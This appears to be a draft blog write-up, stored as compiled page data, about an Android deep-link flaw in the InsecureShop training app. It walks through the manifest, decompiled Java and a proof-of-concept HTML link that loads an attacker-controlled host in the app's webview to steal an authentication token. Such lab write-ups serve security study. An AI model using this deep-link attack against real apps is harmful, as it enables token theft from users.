{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var p=Object.create;var l=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var h=Object.getOwnPropertyNames;var u=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var N=(e,s)=>()=>(s||e((s={exports:{}}).exports,s),s.exports),k=(e,s)=>{for(var c in s)l(e,c,{get:s[c],enumerable:!0})},i=(e,s,c,a)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let t of h(s))!m.call(e,t)&&t!==c&&l(e,t,{get:()=>s[t],enumerable:!(a=d(s,t))||a.enumerable});return e};var g=(e,s,c)=>(c=e!=null?p(u(e)):{},i(s||!e||!e.__esModule?l(c,\"default\",{value:e,enumerable:!0}):c,e)),f=e=>i(l({},\"__esModule\",{value:!0}),e);var r=N((I,o)=>{o.exports=_jsx_runtime});var v={};k(v,{default:()=>b,frontmatter:()=>y});var n=g(r()),y={title:\"InsecureShop - Insufficient URL Validation\",date:\"2022-07-23\",tags:[\"android\",\"appsec\",\"insecureshop\"],draft:!0,summary:\"Possible to load any arbitrary URL in webview via Deeplink\",images:\"/static/images/insecureshop/deeplink.jpg\",layout:\"PostLayout\",canonicalUrl:null};function w(e={}){let{wrapper:s}=e.components||{};return s?(0,n.jsx)(s,Object.assign({},e,{children:(0,n.jsx)(c,{})})):c();function c(){let a=Object.assign({h1:\"h1\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",code:\"code\",h2:\"h2\",pre:\"pre\"},e.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(a.h1,{id:\"insufficient-url-validation\",children:[(0,n.jsx)(a.a,{\"aria-hidden\":\"true\",href:\"#insufficient-url-validation\",tabIndex:\"-1\",children:(0,n.jsx)(a.span,{className:\"icon icon-link\"})}),\"Insufficient URL Validation\"]}),(0,n.jsx)(a.blockquote,{children:(0,n.jsxs)(a.p,{children:[\"The class \",(0,n.jsx)(a.code,{children:\"com.insecureshop.WebViewActivity\"}),\" contains the following code. As per the code, the application registers a path web and a query parameter url.\"]})}),(0,n.jsx)(a.p,{children:\"First step for analysis is to identify the deep links in Manifest file.\"}),(0,n.jsxs)(a.h2,{id:\"what-are-deep-links\",children:[(0,n.jsx)(a.a,{\"aria-hidden\":\"true\",href:\"#what-are-deep-links\",tabIndex:\"-1\",children:(0,n.jsx)(a.span,{className:\"icon icon-link\"})}),\"What are deep links?\"]}),(0,n.jsx)(a.p,{children:\"A deep link is an intent filter system that allows users to directly interact with a specific activity in an android application.\"}),(0,n.jsx)(a.p,{children:\"Example of our activity definition in the manifest file.\"}),(0,n.jsx)(a.pre,{className:\"language-xml\",children:(0,n.jsxs)(a.code,{className:\"code-highlight language-xml\",children:[(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"<\"}),\"activity\"]}),\" \",(0,n.jsxs)(a.span,{className:\"token attr-name\",children:[(0,n.jsx)(a.span,{className:\"token namespace\",children:\"android:\"}),\"name\"]}),(0,n.jsxs)(a.span,{className:\"token attr-value\",children:[(0,n.jsx)(a.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'}),\"com.insecureshop.WebViewActivity\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'})]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"<\"}),\"intent-filter\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"<\"}),\"action\"]}),\" \",(0,n.jsxs)(a.span,{className:\"token attr-name\",children:[(0,n.jsx)(a.span,{className:\"token namespace\",children:\"android:\"}),\"name\"]}),(0,n.jsxs)(a.span,{className:\"token attr-value\",children:[(0,n.jsx)(a.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'}),\"android.intent.action.VIEW\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'})]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"/>\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"<\"}),\"category\"]}),\" \",(0,n.jsxs)(a.span,{className:\"token attr-name\",children:[(0,n.jsx)(a.span,{className:\"token namespace\",children:\"android:\"}),\"name\"]}),(0,n.jsxs)(a.span,{className:\"token attr-value\",children:[(0,n.jsx)(a.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'}),\"android.intent.category.DEFAULT\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'})]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"/>\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"<\"}),\"category\"]}),\" \",(0,n.jsxs)(a.span,{className:\"token attr-name\",children:[(0,n.jsx)(a.span,{className:\"token namespace\",children:\"android:\"}),\"name\"]}),(0,n.jsxs)(a.span,{className:\"token attr-value\",children:[(0,n.jsx)(a.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'}),\"android.intent.category.BROWSABLE\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'})]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"/>\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"<\"}),\"data\"]}),\" \",(0,n.jsxs)(a.span,{className:\"token attr-name\",children:[(0,n.jsx)(a.span,{className:\"token namespace\",children:\"android:\"}),\"scheme\"]}),(0,n.jsxs)(a.span,{className:\"token attr-value\",children:[(0,n.jsx)(a.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'}),\"insecureshop\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,n.jsxs)(a.span,{className:\"token attr-name\",children:[(0,n.jsx)(a.span,{className:\"token namespace\",children:\"android:\"}),\"host\"]}),(0,n.jsxs)(a.span,{className:\"token attr-value\",children:[(0,n.jsx)(a.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'}),\"com.insecureshop\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'})]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"/>\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"</\"}),\"intent-filter\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"</\"}),\"activity\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]})]})}),(0,n.jsxs)(a.p,{children:[(0,n.jsx)(a.code,{children:\"com.insecureshop.webViewActivity\"}),\" is browsable meaning can be accessed from web client. This is possible through resolving the URL in the \",(0,n.jsx)(a.code,{children:\"<data>\"}),\" tags. The webview responds to the scheme of \",(0,n.jsx)(a.code,{children:\"insecureshop\"}),\". Because the webview activity is wrapped under \",(0,n.jsx)(a.code,{children:\"intent-filter\"}),\", therefore meaning it is exported and can be accessed by external applications.\"]}),(0,n.jsx)(a.pre,{className:\"language-java\",children:(0,n.jsxs)(a.code,{className:\"code-highlight language-java\",children:[(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token class-name\",children:\"Intrinsics\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"checkExpressionValueIsNotNull\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"intent\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"intent\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token class-name\",children:\"Uri\"}),\" uri \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" intent\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"getData\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"uri \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"null\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(a.span,{className:\"token class-name\",children:\"String\"}),\" data \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"null\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        data \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"null\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token class-name\",children:\"StringsKt\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"equals$\",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"default\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"uri\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"getPath\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"/web\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token boolean\",children:\"false\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"null\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token class-name\",children:\"Intent\"}),\" intent2 \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:\"getIntent\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token class-name\",children:\"Intrinsics\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"checkExpressionValueIsNotNull\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"intent2\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"intent\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token class-name\",children:\"Uri\"}),\" data2 \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" intent2\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"getData\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"data2 \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"null\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"                data \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" data2\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"getQueryParameter\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'\"url\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"else\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token class-name\",children:\"StringsKt\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"equals$\",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"default\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"uri\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"getPath\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"/webview\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token boolean\",children:\"false\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"null\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token class-name\",children:\"Intent\"}),\" intent3 \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:\"getIntent\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token class-name\",children:\"Intrinsics\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"checkExpressionValueIsNotNull\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"intent3\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"intent\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token class-name\",children:\"Uri\"}),\" data3 \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" intent3\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"getData\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"data3 \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"null\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"                \",(0,n.jsx)(a.span,{className:\"token class-name\",children:\"Intrinsics\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"throwNpe\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token class-name\",children:\"String\"}),\" queryParameter \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" data3\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"getQueryParameter\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'\"url\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"queryParameter \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"null\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"                \",(0,n.jsx)(a.span,{className:\"token class-name\",children:\"Intrinsics\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token function\",children:\"throwNpe\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),(0,n.jsxs)(a.p,{children:[\"The above code checks is the url has \",(0,n.jsx)(a.code,{children:\"web\"}),\" or \",(0,n.jsx)(a.code,{children:\"webview\"}),\" in the URL path. We can use that to craft our attack by sending user an URL we control.\"]}),(0,n.jsx)(a.p,{children:\"We can craft an attack as shown below.\"}),(0,n.jsx)(a.pre,{className:\"language-html\",children:(0,n.jsxs)(a.code,{className:\"code-highlight language-html\",children:[(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsxs)(a.span,{className:\"token doctype\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"<!\"}),(0,n.jsx)(a.span,{className:\"token doctype-tag\",children:\"DOCTYPE\"}),\" \",(0,n.jsx)(a.span,{className:\"token name\",children:\"html\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"<\"}),\"html\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"<\"}),\"body\"]}),\" \",(0,n.jsxs)(a.span,{className:\"token special-attr\",children:[(0,n.jsx)(a.span,{className:\"token attr-name\",children:\"style\"}),(0,n.jsxs)(a.span,{className:\"token attr-value\",children:[(0,n.jsx)(a.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'}),(0,n.jsxs)(a.span,{className:\"token css language-css value\",children:[(0,n.jsx)(a.span,{className:\"token property\",children:\"text-align\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\":\"}),\" center\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"})]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'})]})]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"<\"}),\"h1\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"<\"}),\"a\"]}),\" \",(0,n.jsx)(a.span,{className:\"token attr-name\",children:\"href\"}),(0,n.jsxs)(a.span,{className:\"token attr-value\",children:[(0,n.jsx)(a.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'}),\"insecureshop://com.insecureshop/webview?url=https://attacker.com/\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:'\"'})]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),\"POC\",(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"</\"}),\"a\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"</\"}),\"h1\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"</\"}),\"body\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsxs)(a.span,{className:\"token tag\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"</\"}),\"html\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\">\"})]}),`\n`]})]})}),(0,n.jsxs)(a.p,{children:[\"Using the above \",(0,n.jsx)(a.code,{children:\"attack\"}),\", one is able to steal authentication token in the user's header.\"]})]})}}var b=w;return f(v);})();\n;return Component;","toc":[{"value":"Insufficient URL Validation","url":"#insufficient-url-validation","depth":1},{"value":"What are deep links?","url":"#what-are-deep-links","depth":2}],"frontMatter":{"readingTime":{"text":"4 min read","minutes":3.195,"time":191700,"words":639},"slug":"insecureshop-insufficient-url-validation","fileName":"insecureshop-insufficient-url-validation.mdx","title":"InsecureShop - Insufficient URL Validation","date":"2022-07-23","tags":["android","appsec","insecureshop"],"draft":true,"summary":"Possible to load any arbitrary URL in webview via Deeplink","images":"/static/images/insecureshop/deeplink.jpg","layout":"PostLayout","canonicalUrl":null}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.53,"time":31800,"words":106},"slug":["default"],"fileName":"default.md","name":"Thuri","avatar":"/static/images/profile.png","occupation":"Software Developer","email":"thuri783@gmail.com","github":"https://github.com/thuri10"}],"prev":{"title":"Insecureshop - Hardcoded Credentials","date":"2022-07-23T00:00:00.000Z","tags":["Android","Insecureshop","mobile","appsec"],"draft":false,"summary":"Identify username and password that is hardcoded in the app","images":"/static/images/insecureshop/hardcoded.png","layout":"PostLayout","canonicalUrl":null,"slug":"insecureshop-hardcoded-credentials"},"next":null},"__N_SSG":true}